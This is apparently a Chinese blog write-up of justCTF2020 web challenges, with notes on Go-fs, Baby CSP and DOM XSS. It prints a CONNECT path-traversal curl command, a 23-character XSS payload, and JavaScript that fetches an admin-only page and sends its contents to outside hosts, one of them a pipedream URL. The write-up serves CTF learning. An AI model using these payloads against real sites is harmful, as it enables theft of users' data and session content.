@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="justCTF2020一个都不会啊，纯挨打等wping Forgotten name要猜一个6a开头的子域名，第一反应是子域名查询或者同ip查询。我找的国内的同ip域名查询网站计划不通（随便选了个web题的域名的ip查），老国王找了个子域名查询网站一键打穿然后把域名十六进制解码一下得到flag。。。 Go-fs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="justCTF2020">
+<meta property="og:url" content="https://blog.z3ratu1.cn/justCTF2020.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="justCTF2020一个都不会啊，纯挨打等wping Forgotten name要猜一个6a开头的子域名，第一反应是子域名查询或者同ip查询。我找的国内的同ip域名查询网站计划不通（随便选了个web题的域名的ip查），老国王找了个子域名查询网站一键打穿然后把域名十六进制解码一下得到flag。。。 Go-fs">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-01-30T13:47:19.000Z">
+<meta property="article:modified_time" content="2021-02-17T06:54:46.456Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="Golang">
+<meta property="article:tag" content="ReDoS">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/justCTF2020.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>justCTF2020 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/justCTF2020.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          justCTF2020
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-30 21:47:19" itemprop="dateCreated datePublished" datetime="2021-01-30T21:47:19+08:00">2021-01-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-02-17 14:54:46" itemprop="dateModified" datetime="2021-02-17T14:54:46+08:00">2021-02-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/justCTF2020.html" class="post-meta-item leancloud_visitors" data-flag-title="justCTF2020" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/justCTF2020.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/justCTF2020.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="justCTF2020"><a href="#justCTF2020" class="headerlink" title="justCTF2020"></a>justCTF2020</h1><p>一个都不会啊，纯挨打<br>等wping</p>
+<h2 id="Forgotten-name"><a href="#Forgotten-name" class="headerlink" title="Forgotten name"></a>Forgotten name</h2><p>要猜一个6a开头的子域名，第一反应是子域名查询或者同ip查询。我找的国内的同ip域名查询网站计划不通（随便选了个web题的域名的ip查），老国王找了个子域名查询网站一键打穿<br>然后把域名十六进制解码一下得到flag。。。</p>
+<h2 id="Go-fs"><a href="#Go-fs" class="headerlink" title="Go-fs"></a>Go-fs</h2><p>GO语言写的文件服务，因为源码下下来一看发现不是很长，所以就直接进行了一个Go的零基础学习。也没学到什么然后硬看代码，看了两个小时大概理清什么情况<br>首先自己写了一个文件系统，又实现了一个文件类，看Dockerfile可以看到启动时以tmp文件夹为根目录建立文件系统，文件系统维护一个结构体切片存每个文件的信息，还有一个字节切片存所有文件，每个文件都就直接append上去，然后会对应的存文件的offset和len；文件类就重写了该重写的方法，利用文件系统的信息从字节切片里面按照offset和len读出文件。也写了根目录下有文件夹的操作，但实际上好像并没什么用，并且这个创建过程用户也不可干预，等于说用户交互之前这个文件系统就已经建立完成了。<br>用HandleFunc函数建立路由，根目录的话会用fileServ.ServeHTTP(w, r)这个函数根据请求返回数据，查了下源码实现（没有看的很深，可能问题就在这？），最后是通过r.URL.Path去fileServ文件系统中的文件，用户可控交互就在这了。<br>尝试发现Path会被自动URL解码，如果输入跳目录之类的操作会尝试对路径进行解析之后进行重定向<br>flag就在tmp下，但是有另一个HandleFunc的路由就是flag，导致请求的path为flag时直接返回一个不给</p>
+<h3 id="比赛结束看wp"><a href="#比赛结束看wp" class="headerlink" title="比赛结束看wp"></a>比赛结束看wp</h3><p>上面提到访问路径如果带目录的话就会被尝试解析然后重定向，这个是go语言自己的检查，所以无论如何都会重定向回&#x2F;flag，而flag这个路由被一个handler给拦住了</p>
+<h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>go文档里有这么一句</p>
+<blockquote>
+<p>The path and host are used unchanged for CONNECT requests.</p>
+</blockquote>
+<p>说实话我都没怎么听说过CONNECT这个请求类型（是不是之前学http隧道代理的时候见过。。。）<br>用curl指定请求类型为CONNECT之后再相对路径一把梭就通了<br><code>curl -X CONNECT --path-as-is http://gofs.web.jctf.pro/folder/../flag</code><br>–path-as-is这个选项就是不解析掉一个点或者两个点这种相对路径的意思（burp之类的也能硬发带相对路径的请求，这个应该只是让curl本身别去解析相对路径）</p>
+<h4 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h4><p>说实话我觉得非预期好容易理解哦。。。<br>预期应该就和之前的文件系统操作有关？<br><code> curl -H &#39;Range: bytes=--1&#39; http://gofs.web.jctf.pro/IMG_1052.jpg</code><br>这里的Range: bytes&#x3D;–1会被解析为bytes为-1，最后会导致读取文件系统的位置发生错误，就之前那写的一大段的offset和length之类的不符合正常的情况，就隔着之前的文件读到了flag打通？</p>
+<h2 id="Baby-CSP"><a href="#Baby-CSP" class="headerlink" title="Baby CSP"></a>Baby CSP</h2><p>这得来一个XSS大师。。。<br>可控点两个，一个hash算法一个用户名，指定了哈希算法就产生一个随机字符串用对应算法哈希十次作为nonce，不然就md5十次<br>用户名会直接输出到页面上，理论上可XSS，但长度限制23，且设置了CSP得nonce对<br>用啥算法nonce都得至少八位，且都是0-9a-f，不会出现特殊字符。且我也不能控制哈希的初始字符串，不知道这个CSP咋绕，应该是有神妙手段<br>怎么构造只有23个字符的XSS呢？<br>isAdmin验证过了之后还设置了几个响应头，一个<code>X-Content-Type-Options: nosniff</code>让浏览器把返回内容就按照Content-Type解析，是text&#x2F;html就不能解析JS吗？一个<code>X-Frame-Options: DENY</code>阻止套iframe之类的<br>echo flag之后直接die，也就没有后面的哈希和xss环节了，所以这个请求头又能干嘛？一开始还以为是构造出一个xss让admin访问之后外带内容的，现在看来感觉是只能硬过admin判断自己去看flag了</p>
+<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">"secrets.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$nonce</span> <span class="token operator">=</span> <span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+ <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'X-Content-Type-Options: nosniff'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'X-Frame-Options: DENY'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-type: text/html; charset=UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token punctuation">}</span>
+ <span class="token keyword">else</span><span class="token punctuation">{</span>
+     <span class="token keyword">echo</span> <span class="token string">"You are not an admin!"</span><span class="token punctuation">;</span>
+     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'alg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$_nonce</span> <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'alg'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$nonce</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_nonce</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$nonce</span> <span class="token operator">=</span> <span class="token variable">$_nonce</span><span class="token punctuation">;</span>
+            <span class="token keyword">continue</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$nonce</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$nonce</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"content-security-policy: default-src 'none'; style-src 'nonce-$nonce'; script-src 'nonce-$nonce'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOT</span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>$nonce<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>
+            <span class="token function">setInterval</span><span class="token punctuation">(</span>
+                <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>user<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color<span class="token operator">=</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0.3</span><span class="token operator">?</span><span class="token string">'red'</span><span class="token punctuation">:</span><span class="token string">'black'</span>
+            <span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span> Hello <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>user<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token operator">!</span><span class="token operator">!</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>Click <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?flag<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>here<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span> to get a flag<span class="token operator">!</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
+<span class="token constant">EOT</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment" spellcheck="true">// Found a bug? We want to hear from you! /bugbounty.php</span>
+<span class="token comment" spellcheck="true">// Check /Dockerfile</span>
+</code></pre>
+<h3 id="看WP"><a href="#看WP" class="headerlink" title="看WP"></a>看WP</h3><p>看dockerfile可以看到php.ini用的是development的，也就意味着报错会直接输出出来（不过不看dockerfile直接乱输也能试出来）</p>
+<h4 id="warning缓冲区溢出覆盖header"><a href="#warning缓冲区溢出覆盖header" class="headerlink" title="warning缓冲区溢出覆盖header"></a>warning缓冲区溢出覆盖header</h4><p>CSP是由header函数发送的，header有一个要求，即调用该函数前不能有任何的实际输出(比如echo，或者HTML标签之类的)，否则header的函数调用会被忽略<br>但是看代码的话header之前是没有任何输出的，但是可以通过输一个不存在的算法触发warning，通过for循环是个warning塞爆缓冲区，使得其成为实际输出，就能阻止header函数的调用。<br>echo或者是HTML内容都是直接输出，所以会直接使header失效，且没有长度限制，而PHP的默认缓冲区大小为4096，所以得用总长度超出4096的warning把缓冲区塞满就会强制输出使得header无效<br>之后就是一个23长度的XSS了</p>
+<h4 id="23长度XSS"><a href="#23长度XSS" class="headerlink" title="23长度XSS"></a>23长度XSS</h4><p>说实话也很极限，这里直接抄一个payload<code>&lt;svg/onload=eval(name)&gt;</code>，长度刚好是23，此处的name为window.name属性</p>
+<h4 id="Window-name"><a href="#Window-name" class="headerlink" title="Window.name"></a>Window.name</h4><p>一开始看到上面这个操作感觉挺玄幻的，因为都已经location跳转了，怎么这个name还能继承过去并被eval？<br>一个tab(标签页)就是一个window，它可以打开各种网页，也可以在网页之间跳转，其打开的页面均对window.name拥有读写权限，window.name只要这个tab不关闭就能保持不变，即使是从一个页面跳转到了另一个页面，所以这里可以location跳转之后还能eval name这个之前定义的变量的内容</p>
+<p>比如</p>
+<pre class=" language-javascript"><code class="language-javascript">    window<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"这是a页面的内容"</span><span class="token punctuation">;</span> 
+    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span> b<span class="token punctuation">.</span>html<span class="token punctuation">;</span>
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>写一个payload</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+    name<span class="token operator">=</span>"<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'?flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">async</span> e<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`https://www.z3ratu1.cn/jctf?</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">await</span> e<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>"<span class="token punctuation">;</span>
+    location <span class="token operator">=</span> <span class="token string">'https://baby-csp.web.jctf.pro/?user=%3Csvg%20onload=eval(name)%3E&amp;alg='</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">'400'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>打自己成功了，可以收到一个<code>you are not admin!</code>但是bot好像坏掉了？我只能收到提交的链接，就算payload里直接发一个请求也收不到</p>
+<p>暂时就当自己打通了吧。。。。</p>
+<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>过年摸鱼的下场，现在回来发现环境已经关掉了。出题人提到因为admin的cookie的samesite属性默认为lax</p>
+<blockquote>
+<p>Cookies允许与顶级导航一起发送，并将与第三方网站发起的GET请求一起发送。</p>
+</blockquote>
+<p>就是只能链接跳转之类的才会发送第三方cookie，所以想用iframe打的话得window.open新开一个tab，然后再读取tab的内容发送出来，我上面这个是直接location跳转到了babycsp这个网站，lax cookie会携带，然后再发出来<br>iframe版payload<br><code>let x = window.open(&#39;/?flag&#39;); x.onload = () =&gt; &#123;fetch(&#39;https://enavfajw8uem.x.pipedream.net/?f=&#39; + x.document.documentElement.innerHTML)&#125;</code></p>
+<p>出题人多次提到bot会在网站加载结束之后立即关闭网页，不知道这个是不是之前没打通的原因，可能加载完了还没处理完脚本吗？看一个外国大哥的wp里放了一个NASA的巨型图片使得页面能长时间保持在加载状态<br><code>&lt;img src=&quot;https://eoimages.gsfc.nasa.gov/images/imagerecords/73000/73751/world.topo.bathy.200407.3x21600x21600.B1.png&quot; style=&quot;display:none&quot; /&gt;</code></p>
+<h2 id="Computeration"><a href="#Computeration" class="headerlink" title="Computeration"></a>Computeration</h2><p>睡一觉起来之后放的新题，是XSS，还是DOM XSS，是我完全不会的东西，开始临时学习<br>直接script居然X不了</p>
+<p>开始学习并获得一些前置知识</p>
+<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>DOM XSS就是没有服务端参与，没有什么服务端接受输入再拼到页面上，而是直接是前端js拼接location.hash，URL参数之类的东西造成的XSS，也算一种反射型XSS吧</p>
+<h3 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h3><p>就是URL中#号后面的部分（包括井号），若不存在则为空字符串，若只有井号也为空串，location.hash不会进行URL解码<br>不过#后面的数据不会发送给服务端，也就意味着能过waf</p>
+<h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>代码中添加note是通过修改innerHTML完成的，尝试直接scriptXSS失败，问了下师傅再百度一下，还真是innerHTML的原因</p>
+<blockquote>
+<p>HTML 5 中指定不执行由 innerHTML 插入的<code> &lt;script&gt;</code> 标签。然而，有很多不依赖 <code>&lt;script&gt;</code> 标签去执行 JavaScript 的方式。所以当你使用 innerHTML 去设置你无法控制的字符串时，这仍然是一个安全问题。</p>
+</blockquote>
+<p>所以要这么XSS<code>element.innerHTML = &quot;&lt;img src=x onerror=\&quot;alert(&#39;XSS Attack&#39;)\&quot;&gt;&quot;; </code></p>
+<h3 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h3><p>看名字就知道是本地存储，也就是存在我本地的东西。。。对应还有一个sessionStorage<br>sessionStorage 是针对session的数据存储，关闭窗口后删除。<br>localStorage 是一个本地的没有时间限制的数据存储。<br>本地存储的东西终究打不了远程</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss</a><br>讲到了常用的可控资源和常见的可以利用的”水坑”，攻击就是将source导入到sink中，还蛮有意思的</p>
